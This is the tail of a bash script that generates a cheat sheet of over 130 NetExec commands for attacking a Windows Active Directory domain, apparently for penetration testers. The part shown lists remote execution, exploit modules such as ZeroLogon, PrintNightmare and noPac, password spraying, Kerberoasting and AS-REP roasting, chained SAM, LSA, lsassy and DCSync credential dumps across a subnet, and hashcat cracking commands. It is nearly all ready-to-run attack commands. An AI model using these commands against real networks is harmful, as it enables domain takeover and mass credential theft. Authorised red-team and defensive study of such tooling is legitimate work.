cmd "Spider — exclude images/videos" \
    "nxc smb ${IP} ${AAUTH} -M spider_plus -o EXCLUDE_EXTS=jpg,png,gif,mp4,mp3,avi"

section "Alternative Execution Methods" "$FIRE_E"

cmd "Execute via WMI" \
    "nxc wmi ${IP} ${AAUTH} -x 'ipconfig'"

cmd "Execute via WinRM" \
    "nxc winrm ${IP} ${AAUTH} -x 'whoami /all'"

cmd "Execute via RDP" \
    "nxc rdp ${IP} ${AAUTH} -x 'cmd.exe /c whoami'"

cmd "Execute via SSH (Linux targets)" \
    "nxc ssh ${IP} -u '${USER}' -p '${PASS}' -x 'id'"


# ══════════════════════════════════════════════════════════════════════
# PHASE 8: VULNERABILITY CHECKS & EXPLOIT MODULES
# ══════════════════════════════════════════════════════════════════════
phase_header "8" "VULNERABILITY CHECKS & EXPLOIT MODULES" "14" "$BR" "$SHIELD"

section "Critical Vulnerabilities" "$SKULL"

cmd "MS17-010 (EternalBlue) — no creds required" \
    "nxc smb ${SUBNET} -u '' -p '' -M ms17-010"

cmd "ZeroLogon (CVE-2020-1472) — no creds required" \
    "nxc smb ${DC_IP} -u '' -p '' -M zerologon"

cmd "SMBGhost (CVE-2020-0796) — no creds required" \
    "nxc smb ${SUBNET} -M smbghost"

cmd "PrintNightmare (CVE-2021-1675)" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' -M printnightmare"

cmd "PetitPotam (NTLM coerce via EFS)" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' -M petitpotam"

cmd "noPac (CVE-2021-42278 + CVE-2021-42287)" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' -M nopac"

cmd "MS14-068 (Kerberos PAC validation)" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' -M ms14-068"

section "Configuration Issues" "$WARN"

cmd "LDAP signing enforcement" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' -M ldap-checker"

cmd "Coerced authentication methods" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' -M coerce_plus"

cmd "WebDAV detection" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' -M webdav"

section "Infrastructure Enumeration" "$EYE"

cmd "Enumerate SCCM infrastructure" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' -M sccm"

cmd "Check for vulnerable Exchange servers" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' -M exchange"

cmd "Check group membership recursively" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' -M groupmembership"

cmd "GPP passwords (Group Policy Preferences)" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' -M gpp_password"


# ══════════════════════════════════════════════════════════════════════
# PHASE 9: KILLER COMBO CHAINS
# ══════════════════════════════════════════════════════════════════════
phase_header "9" "KILLER COMBO CHAINS" "6" "$FIRE" "$FIRE_E"

section "Full Domain Enumeration Pipeline" "$BOLT"

cmd "Complete credential harvest — run all offensive modules in sequence" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --bloodhound -c All && nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --asreproast asrep_hashes.txt && nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --kerberoast kerberoast_hashes.txt && nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' -M laps && nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --gmsa && nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --trusted-for-delegation"

cmd "Password spray + AS-REP roast + crack in one flow" \
    "nxc ldap ${DC_IP} -u users.txt -p 'Password123!' --asreproast asrep_combined.txt --continue-on-success && hashcat -m 18200 asrep_combined.txt /usr/share/wordlists/rockyou.txt"

section "Privileged Operations" "$SKULL"

cmd "Scan subnet for admin access + dump all secrets" \
    "nxc smb ${SUBNET} ${AAUTH} --sam --lsa --continue-on-success"

cmd "Full credential harvest across domain (lsassy)" \
    "nxc smb ${SUBNET} ${AAUTH} -M lsassy --continue-on-success"

cmd "Find admin everywhere + DCSync" \
    "nxc smb ${SUBNET} ${AAUTH} | grep -i '(Pwn3d!)' && nxc smb ${DC_IP} ${AAUTH} --ntds"

cmd "Complete domain compromise (DCSync + BloodHound)" \
    "nxc smb ${DC_IP} ${AAUTH} --ntds && nxc ldap ${DC_IP} ${AAUTH} --bloodhound -c All"


# ══════════════════════════════════════════════════════════════════════
# PHASE 10: PRO TIPS & ADVANCED USAGE
# ══════════════════════════════════════════════════════════════════════
phase_header "10" "PRO TIPS & ADVANCED USAGE" "10" "$MINT" "$STAR"

section "Performance Optimization" "$BOLT"

cmd "Use threads for faster subnet scanning (100 threads)" \
    "nxc smb ${SUBNET} -u '${USER}' -p '${PASS}' -t 100 --continue-on-success"

cmd "Always use --continue-on-success for subnet scans" \
    "nxc smb ${SUBNET} -u users.txt -p passwords.txt --continue-on-success"

section "Output Management" "$EYE"

cmd "Save output to file" \
    "nxc smb ${SUBNET} -u '${USER}' -p '${PASS}' --continue-on-success | tee scan_results.txt"

cmd "Verbose output for debugging" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' -vv"

cmd "Extract just computer names from output" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --computers | awk '{print \$2}' > computers.txt"

cmd "Filter output — find admin accounts" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --users | grep -i 'admin'"

section "Authentication Options" "$KEY"

cmd "Use local authentication (not domain)" \
    "nxc smb ${IP} -u '${ADMIN_USER}' -p 'LocalPass123!' --local-auth"

cmd "Specify custom SMB port" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' --port 4445"

cmd "Use SOCKS proxy for pivoting" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' --proxy socks5://127.0.0.1:1080"

section "Automation with xargs" "$FIRE_E"

cmd "Automated exploitation pipeline — shares on all discovered computers" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --computers | awk '{print \$2}' | xargs -I {} nxc smb {} -u '${USER}' -p '${PASS}' --shares"

cmd "Automated SAM dump across discovered computers" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --computers | awk '{print \$2}' | xargs -I {} nxc smb {} ${AAUTH} --sam"


# ══════════════════════════════════════════════════════════════════════
# QUICK REFERENCE — TOP 10 MUST-RUN COMMANDS
# ══════════════════════════════════════════════════════════════════════
echo ""
echo -e "${BD}${GOLD}╔════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BD}${GOLD}║  ${STAR}  QUICK REFERENCE — TOP 10 MUST-RUN COMMANDS                       ║${NC}"
echo -e "${BD}${GOLD}╚════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "  ${BD}${W} 1.${NC} ${LIME}Check creds & find admin access:${NC}"
echo -e "     ${BG}nxc smb ${SUBNET} -u '${USER}' -p '${PASS}' --continue-on-success${NC}"
echo ""
echo -e "  ${BD}${W} 2.${NC} ${LIME}Collect BloodHound data (map entire domain):${NC}"
echo -e "     ${BG}nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --bloodhound -c All${NC}"
echo ""
echo -e "  ${BD}${W} 3.${NC} ${LIME}Kerberoast (offline hash cracking):${NC}"
echo -e "     ${BG}nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --kerberoast kerb.txt${NC}"
echo ""
echo -e "  ${BD}${W} 4.${NC} ${LIME}AS-REP Roast (more offline hashes):${NC}"
echo -e "     ${BG}nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --asreproast asrep.txt${NC}"
echo ""
echo -e "  ${BD}${W} 5.${NC} ${LIME}Check for LAPS passwords:${NC}"
echo -e "     ${BG}nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' -M laps${NC}"
echo ""
echo -e "  ${BD}${W} 6.${NC} ${LIME}Check for GMSA passwords:${NC}"
echo -e "     ${BG}nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --gmsa${NC}"
echo ""
echo -e "  ${BD}${W} 7.${NC} ${LIME}Find delegation opportunities:${NC}"
echo -e "     ${BG}nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --trusted-for-delegation${NC}"
echo ""
echo -e "  ${BD}${W} 8.${NC} ${LIME}DCSync (if you have admin):${NC}"
echo -e "     ${BG}nxc smb ${DC_IP} ${AAUTH} --ntds${NC}"
echo ""
echo -e "  ${BD}${W} 9.${NC} ${LIME}Dump SAM across subnet:${NC}"
echo -e "     ${BG}nxc smb ${SUBNET} ${AAUTH} --sam --continue-on-success${NC}"
echo ""
echo -e "  ${BD}${W}10.${NC} ${LIME}Harvest credentials from memory:${NC}"
echo -e "     ${BG}nxc smb ${SUBNET} ${AAUTH} -M lsassy --continue-on-success${NC}"
echo ""


# ══════════════════════════════════════════════════════════════════════
# HASHCAT CHEAT SHEET
# ══════════════════════════════════════════════════════════════════════
echo -e "${BD}${PURP}╔════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BD}${PURP}║  ${BOLT}  HASHCAT CRACKING REFERENCE                                        ║${NC}"
echo -e "${BD}${PURP}╚════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${BD}${PEACH}Hash Type${NC}               ${BD}${PEACH}Mode${NC}     ${BD}${PEACH}Command${NC}"
echo -e "  ${DKGR}─────────────────────── ──────── ─────────────────────────────────────${NC}"
echo -e "  ${W}NTLM${NC}                    ${BY}-m 1000${NC}   ${BG}hashcat -m 1000 hashes.txt rockyou.txt${NC}"
echo -e "  ${W}NetNTLMv2${NC}               ${BY}-m 5600${NC}   ${BG}hashcat -m 5600 hashes.txt rockyou.txt${NC}"
echo -e "  ${W}AS-REP (RC4)${NC}            ${BY}-m 18200${NC}  ${BG}hashcat -m 18200 asrep.txt rockyou.txt${NC}"
echo -e "  ${W}Kerberoast (RC4)${NC}        ${BY}-m 13100${NC}  ${BG}hashcat -m 13100 kerb.txt rockyou.txt${NC}"
echo -e "  ${W}Kerberoast (AES128)${NC}     ${BY}-m 19600${NC}  ${BG}hashcat -m 19600 kerb.txt rockyou.txt${NC}"
echo -e "  ${W}Kerberoast (AES256)${NC}     ${BY}-m 19700${NC}  ${BG}hashcat -m 19700 kerb.txt rockyou.txt${NC}"
echo -e "  ${W}DCC2 (cached creds)${NC}     ${BY}-m 2100${NC}   ${BG}hashcat -m 2100 hashes.txt rockyou.txt${NC}"
echo -e "  ${W}LM Hash${NC}                 ${BY}-m 3000${NC}   ${BG}hashcat -m 3000 hashes.txt rockyou.txt${NC}"
echo ""


# ══════════════════════════════════════════════════════════════════════
# COMMAND COUNT SUMMARY
# ══════════════════════════════════════════════════════════════════════
echo -e "${BD}${C}╔════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BD}${C}║  COMMAND COUNT SUMMARY                                                ║${NC}"
echo -e "${BD}${C}╚════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${SKY}Phase  1:${NC} Initial Reconnaissance................ ${BD}${W}17${NC} commands"
echo -e "  ${GOLD}Phase  2:${NC} Credential Attacks.................... ${BD}${W}12${NC} commands"
echo -e "  ${PURP}Phase  3:${NC} Kerberos & Delegation Enumeration..... ${BD}${W}10${NC} commands"
echo -e "  ${BR}Phase  4:${NC} Secrets & Credential Dumping.......... ${BD}${W}18${NC} commands"
echo -e "  ${BG}Phase  5:${NC} BloodHound Data Collection............ ${BD}${W}5${NC}  commands"
echo -e "  ${TEAL}Phase  6:${NC} Advanced LDAP Queries................. ${BD}${W}20${NC} commands"
echo -e "  ${BO}Phase  7:${NC} Command Execution & Post-Exploitation. ${BD}${W}15${NC} commands"
echo -e "  ${BR}Phase  8:${NC} Vulnerability Checks & Exploits....... ${BD}${W}14${NC} commands"
echo -e "  ${FIRE}Phase  9:${NC} Killer Combo Chains................... ${BD}${W}6${NC}  commands"
echo -e "  ${MINT}Phase 10:${NC} Pro Tips & Advanced Usage............. ${BD}${W}10${NC} commands"
echo -e "  ${DKGR}                                                 ───────────${NC}"
echo -e "  ${BD}${GOLD}TOTAL:${NC}   ${BD}${W}130+ commands${NC}"
echo ""

# ── Footer ────────────────────────────────────────────────────────────
echo -e "${DKGR}═══════════════════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "  ${DIM}Generated on:${NC}  ${PEACH}$(date)${NC}"
echo -e "  ${DIM}Target:${NC}        ${BC}${IP}${NC} ${DIM}(${DOMAIN})${NC}"
echo -e "  ${DIM}User:${NC}          ${BG}${USER}${NC}"
echo ""
echo -e "  ${BD}${Y}Remember:${NC}"
echo -e "    ${BULLET} Always use ${BD}--continue-on-success${NC} for subnet scans"
echo -e "    ${BULLET} Use threads ${BD}(-t 100)${NC} for faster scanning"
echo -e "    ${BULLET} Save output with ${BD}| tee filename.txt${NC}"
echo -e "    ${BULLET} Check module availability: ${BD}nxc smb --list-modules${NC}"
echo -e "    ${BULLET} ${BR}CHECK LOCKOUT POLICY BEFORE SPRAYING!${NC}"
echo ""
echo -e "  ${FIRE_E} ${BD}${GOLD}Happy Hacking!${NC} ${FIRE_E}"
echo ""
echo -e "${DKGR}═══════════════════════════════════════════════════════════════════════════${NC}"

}

# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════
main() {
    banner
    collect_input

    echo ""
    echo -e "  ${BD}${TEAL}[i]${NC} Generating 130+ commands..."
    echo ""

    # Generate to both terminal AND file (with ANSI colors preserved in file)
    generate 2>&1 | tee "${OUTPUT_FILE}"

    echo ""
    echo -e "${BD}${GOLD}╔════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BD}${GOLD}║                  ${OK}  GENERATION SUCCESSFUL!                            ║${NC}"
    echo -e "${BD}${GOLD}╚════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${OK} File saved: ${BD}${BC}${OUTPUT_FILE}${NC}"
    echo ""
    echo -e "  ${BD}${W}Statistics:${NC}"
    echo -e "    ${BULLET} Total commands:  ${BD}130+${NC}"
    echo -e "    ${BULLET} Target IP:       ${BC}${IP}${NC}"
    echo -e "    ${BULLET} Domain:          ${BY}${DOMAIN}${NC}"
    echo -e "    ${BULLET} User:            ${BG}${USER}${NC}"
    echo -e "    ${BULLET} Admin hash:      $( $HAS_ADMIN && echo "${BG}included${NC}" || echo "${Y}not set — placeholder used${NC}" )"
    echo -e "    ${BULLET} AES key:         $( $HAS_AES    && echo "${BG}included${NC}" || echo "${DIM}skipped${NC}" )"
    echo -e "    ${BULLET} Ccache:          $( $HAS_CCACHE  && echo "${BG}included${NC}" || echo "${DIM}skipped${NC}" )"
    echo ""
    echo -e "  ${BD}${W}View the file:${NC}"
    echo -e "    ${BULLET} ${O}cat ${OUTPUT_FILE}${NC}          ${DIM}# colorful view in terminal${NC}"
    echo -e "    ${BULLET} ${O}less -R ${OUTPUT_FILE}${NC}      ${DIM}# scrollable colorful view${NC}"
    echo -e "    ${BULLET} ${O}grep -i 'bloodhound' ${OUTPUT_FILE}${NC}"
    echo -e "    ${BULLET} ${O}grep -i 'kerberoast' ${OUTPUT_FILE}${NC}"
    echo -e "    ${BULLET} ${O}grep -i 'dcsync\\|ntds' ${OUTPUT_FILE}${NC}"
    echo ""
    echo -e "  ${FIRE_E} ${BD}${GOLD}Happy Hacking!${NC} ${FIRE_E}"
    echo ""
}

main "$@"
